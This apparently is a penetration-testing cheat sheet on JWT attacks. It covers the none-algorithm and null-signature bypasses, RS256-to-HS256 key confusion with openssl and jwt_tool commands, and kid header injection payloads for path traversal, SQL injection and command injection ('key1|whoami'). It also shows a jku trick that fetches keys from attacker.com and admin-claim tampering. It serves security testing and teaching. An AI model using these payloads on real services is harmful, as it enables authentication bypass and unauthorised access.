# JWT_hacking

- None algorithm attack – CVE-2015-9235

    - This attack targets an option in the JWT standard for producing unsigned keys. The output literally omits any signature portion after the second dot. Due to weaknesses in some libraries or server configurations, a service may read our tampered request, see that it does not need to be signed, and then just accept it on trust. This can be exploited using JWT_Tool with the -X a option

ex-
 ![image](https://user-images.githubusercontent.com/56452603/152351911-bdfb088d-571e-4077-8ac3-b3a152cd473e.png)

- Signature checked or not ?
  - Try Delete some character from the signature and see what behaviour you will get by application
   - If an error message occurs the signature is being checked
   - If there is no any error occur then it's time to start tampering the Payload.
    
- RS256 to HS256 Key Confusion Attack – CVE-2016-5431
   - So here we are going to change the algorithm from RS256 to HS256. Hence, this way the workflow would convert from Asymmetric to Symmetric encryption and we can sign the new tokens with the same public key.
As this is a public key, so this key has to remain public. So you can find it by yourself on the internet or another potential source is the server’s TLS certificate, which may be being re-used for JWT operations:
command:
openssl s_client -connect <hostname>:443
  
    - Copy the “Server certificate” output to a file (e.g. cert.pem) and extract the public key (to a file called key.pem) by running:
  
     - openssl x509 -in cert.pem -pubkey -noout > key.pem
  
     - This how you can get public.pem of any host.

     - Save this public key in the file named public.pem
     - To change the algorithm we are again going to use the same tool named jwt_tool.
     - First, we will see what is the behaviour of the application with the given RS256 signed token.

      - Send JWT to validate the token

     - You can see token is validated by the server So let’s start changing the algorithm with the tool.
     - Command with an example :
     - To just change the algorithm we can use this command
     - python3 jwt_tool.py <JWT TOKEN> -S hs256 -k public.pem


- null signature
    - Delete the signature from the end of the token. If vulnerable the application will fail to check the signature as it sees nothing that needs checking.
    - $ python3 jwt_tool.py JWT_HERE -X n
   - If page returns valid then you have a bypass - go tampering.

- kid parameter injections
     - if there any kid parameter available in the token the you can check for path travesal,SQLI and RCE.

    - ex- 
 {
  ...
  ...
  "kid": "../../../../../../dev/null"  
  "kid": "xxxx' UNION SELECT 'aaa"  
  "kid": "key1|whoami"
 }

 - Attacks using the jku header
      - In the JWT header, developers can also use the jku parameter to specify the JSON Web Key Set URL. This parameter indicates where the application can find the JSON Web Key (JWK) used to verify the signature – basically the public key in JSON format.

     - To illustrate, let’s take the following JWT that uses the jku parameter to specify the public key:
 -ex.  
  {
  "alg": "RS256",
  "typ": "JWT",
  "jku":"https://example.com/key.json"
   }  
    - Using https://trusted (for example https://trusted@attacker.com/key.json), if the application checks for URLs starting with trusted

- Payload Tamppering
     - change payload and see waht behaviour you will get.
    -ex.
    { 
      "IsAdmin":"1",
      "role":"admin"
    }
    - check signeture is verified or not 
  
  

  # Tool
 - https://github.com/ticarpi/jwt_tool
 - https://github.com/hahwul/jwt-hack
    
 -  https://jwt.io/
